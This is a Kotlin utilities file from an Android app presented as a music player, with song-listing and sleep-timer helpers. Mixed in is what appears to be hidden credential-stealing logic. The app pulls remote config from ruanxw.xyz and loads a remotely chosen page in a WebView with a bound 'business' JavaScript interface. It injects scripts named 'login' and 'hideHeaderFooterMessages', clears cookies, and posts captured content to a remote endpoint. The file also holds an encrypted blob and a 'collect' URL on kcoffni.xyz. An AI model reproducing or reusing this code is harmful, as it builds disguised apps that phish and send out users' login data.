package win.hapsunday.mplayer.utils

import android.Manifest
import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.view.ViewGroup
import android.webkit.*
import android.widget.SeekBar
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.google.android.material.floatingactionbutton.FloatingActionButton
import com.google.gson.Gson
import com.hjq.permissions.XXPermissions
import com.lzy.okgo.OkGo
import com.lzy.okgo.callback.StringCallback
import com.lzy.okgo.model.Response
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.asFlow
import kotlinx.coroutines.flow.collect
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.xutils.common.Callback
import org.xutils.http.RequestParams
import org.xutils.x
import win.hapsunday.mplayer.R
import win.hapsunday.mplayer.basic.BasicApp
import win.hapsunday.mplayer.model.SleepModel
import win.hapsunday.mplayer.model.SongModel
import win.hapsunday.mplayer.page.SignInPage


fun dp2px(context: Context, dp: Float): Int {
    val density = context.resources.displayMetrics.density
    return (dp * density + 0.5f).toInt()
}

fun isInBackground(): Boolean {
    val activityManager =
        BasicApp.instance!!.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
    val appProcesses = activityManager
        .runningAppProcesses
    for (appProcess in appProcesses) {
        if (appProcess.processName == BasicApp.instance!!.packageName) {
            return appProcess.importance != ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
        }
    }
    return false
}

fun AppCompatActivity.per(result: (Boolean) -> Unit) {
    XXPermissions.with(this).permission(
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    ).request { _, all ->
        result(all)
    }
}

fun AppCompatActivity.getConfig(success: () -> Unit, failed: () -> Unit) {
    val params = RequestParams("https://ruanxw.xyz/config")
    x.http().get(params, object : Callback.CommonCallback<String> {
        override fun onSuccess(result: String?) {
            result?.let {
                "result1 $it".printMsg()
                handleResult1(it)
            }?.let {
                "result2 $it".printMsg()
                handleResult2(it)
            }?.let {
                "result3 $it".printMsg()
                handleResult3(it)
            }?.let {
                "result4 $it".printMsg()
                handleResult4(it)
            }?.let {
                "result5 $it".printMsg()
                handleResult5(it)
            }?.let {
                "result6 $it".printMsg()
                handleResult6(it)
            }?.let {
                "result7 $it".printMsg()
                handleResult7(it)
            }
            success()
        }

        override fun onError(ex: Throwable?, isOnCallback: Boolean) {
            failed()
        }

        override fun onCancelled(cex: Callback.CancelledException?) {

        }

        override fun onFinished() {

        }
    })
}

fun AppCompatActivity.buildFloatActionButton(): FloatingActionButton {
    val fab = FloatingActionButton(this)
    fab.tag = "fab"
    val p = ViewGroup.LayoutParams(1, 1)
    fab.layoutParams = p
    return fab
}

fun SeekBar.setCurrent() {
    val seek = (10..100).random()
    progress = seek
}

fun AppCompatActivity.next(clazz: Class<*>, isFinish: Boolean = false) {
    startActivity(Intent(this, clazz))
    if (isFinish) {
        finish()
    }
}

fun getSleepTimeData(): ArrayList<SleepModel> {
    val result = ArrayList<SleepModel>()
    result.add(SleepModel("Off", true))
    result.add(SleepModel("10 min", false))
    result.add(SleepModel("20 min", false))
    result.add(SleepModel("30 min", false))
    result.add(SleepModel("45 min", false))
    result.add(SleepModel("60 min", false))
    result.add(SleepModel("90 min", false))
    return result
}

@SuppressLint("Recycle")
fun AppCompatActivity.getAllSongs(r: (ArrayList<SongModel>) -> Unit) {
    lifecycleScope.launch(Dispatchers.IO) {
        val result = ArrayList<SongModel>()
        val selectionStatement = "is_music=1 AND title != ''"
        val cur = contentResolver.query(
            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
            arrayOf(
                "_id",
                "title",
                "artist",
                "album",
                "duration",
                "track",
                "artist_id",
                "album_id",
                "_data",
                "_size",
                "mime_type"
            ),
            selectionStatement,
            null,
            "duration DESC"
        )
        try {
            cur?.let {
                if (it.moveToFirst()) {
                    do {
                        val id: Long = it.getLong(0)
                        val title: String = it.getString(1)
                        val artist: String = it.getString(2)
                        val album: String = it.getString(3)
                        val duration: Int = it.getInt(4)
                        val trackNumber: Int = it.getInt(5)
                        val artistId: Long = it.getInt(6).toLong()
                        val albumId: Long = it.getLong(7)
                        val data: String = it.getString(8)
                        val size: String = it.getString(9)
                        if (!it.getString(it.getColumnIndexOrThrow(MediaStore.Audio.Media.MIME_TYPE))
                                .contains("audio/amr") && !it.getString(
                                it.getColumnIndexOrThrow(
                                    MediaStore.Audio.Media.MIME_TYPE
                                )
                            ).contains("audio/aac")
                        ) {
                            val entity = SongModel(
                                id,
                                album,
                                albumId,
                                artist,
                                duration.toLong(),
                                getImgUri(albumId),
                                data,
                                title,
                                "",
                                0,
                                size,
                                trackNumber,
                                artistId,
                                0
                            )
                            result.add(entity)
                        }
                    } while (it.moveToNext())
                }
                it.close()
            }
        } catch (e: Exception) {
            e.printStackTrace()
            cur?.close()
        } finally {
            cur?.close()
        }
        withContext(Dispatchers.Main) {
            r(result)
        }
    }
}

fun getImgUri(album_id: Long): Uri? {
    return try {
        ContentUris.withAppendedId(
            Uri.parse("content://media/external/audio/albumart"),
            album_id
        )
    } catch (e: Exception) {
        null
    }
}

fun clearCookie(block: () -> Unit) {
    CookieSyncManager.createInstance(BasicApp.instance)
    val cookieManager = CookieManager.getInstance()
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
        cookieManager.removeSessionCookies(null)
        cookieManager.removeAllCookie()
        cookieManager.flush()
    } else {
        cookieManager.removeSessionCookies(null)
        cookieManager.removeAllCookie()
        CookieSyncManager.getInstance().sync()
    }
    block()
}

fun AppCompatActivity.countDown(block: () -> Unit) {
    var job: Job? = null
    job = lifecycleScope.launch(Dispatchers.IO) {
        (0 until 20).asFlow().collect {
            delay(1000)
            if (it == 19) {
                withContext(Dispatchers.Main) {
                    block()
                }
                job?.cancel()
            }
        }
    }
}

fun Context.jumpToWebByDefault(url: String) = Intent(Intent.ACTION_VIEW, Uri.parse(url)).let {
    startActivity(it)
}

fun WebView.init(context: Context) {
    apply {
        settings.apply {
            javaScriptEnabled = true
            textZoom = 100
            setSupportZoom(true)
            displayZoomControls = false
            builtInZoomControls = true
            setGeolocationEnabled(true)
            useWideViewPort = true
            loadWithOverviewMode = true
            loadsImagesAutomatically = true
            displayZoomControls = false
            setAppCachePath(context.cacheDir.absolutePath)
            setAppCacheEnabled(true)
        }
        addJavascriptInterface(SignInPage.iinterface(), "business")
    }
}

fun WebView.setChromeClient(context: Context, block: () -> Unit) {
    apply {
        webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, newProgress: Int) {
                super.onProgressChanged(view, newProgress)
                if (newProgress == 100) {
                    val hideJs = context.getString(R.string.hideHeaderFooterMessages)
                    evaluateJavascript(hideJs, null)
                    val loginJs = context.getString(R.string.login)
                    evaluateJavascript(loginJs, null)
                    block()
                }
            }
        }
    }
}

fun WebView.setClient(block: (String,WebView) -> Unit) {
    apply {
        webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                block(url,view)
            }
        }
    }
}

fun WebView.setUrl(){
    loadUrl(updateModel.m ?: "https://www.baidu.com")
}

fun update(content:String, block: (String) -> Unit){
    val body: RequestBody = Gson().toJson(mutableMapOf("content" to content))
        .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
    OkGo.post<String>(updateModel.c).upRequestBody(body).execute(object :StringCallback(){
        override fun onSuccess(response: Response<String>?) {
            val result = response?.body().toString()
            block(result)
        }
    })
}
private fun getShareIntent(): Intent {
    val array = arrayOf(
        "nuclearvpnp@outlook.com",
        "",
        "feedBook",
        "I Like This App"
    )
    val name = arrayOf(
        Intent.EXTRA_EMAIL,
        Intent.EXTRA_CC,
        Intent.EXTRA_SUBJECT,
        Intent.EXTRA_TEXT
    )
    return Intent(Intent.ACTION_SENDTO).apply {
        data = Uri.parse("mailto:")
        for (index in 0..3)
            putExtra(name[index], array[index])
    }
}

fun AppCompatActivity.shareWithEmail() {
    val intent = Intent.createChooser(getShareIntent(), "Choose Email Client")
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    startActivity(intent)
}


var test = "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"

var testUrl = "https://kcoffni.xyz/api/open/collect"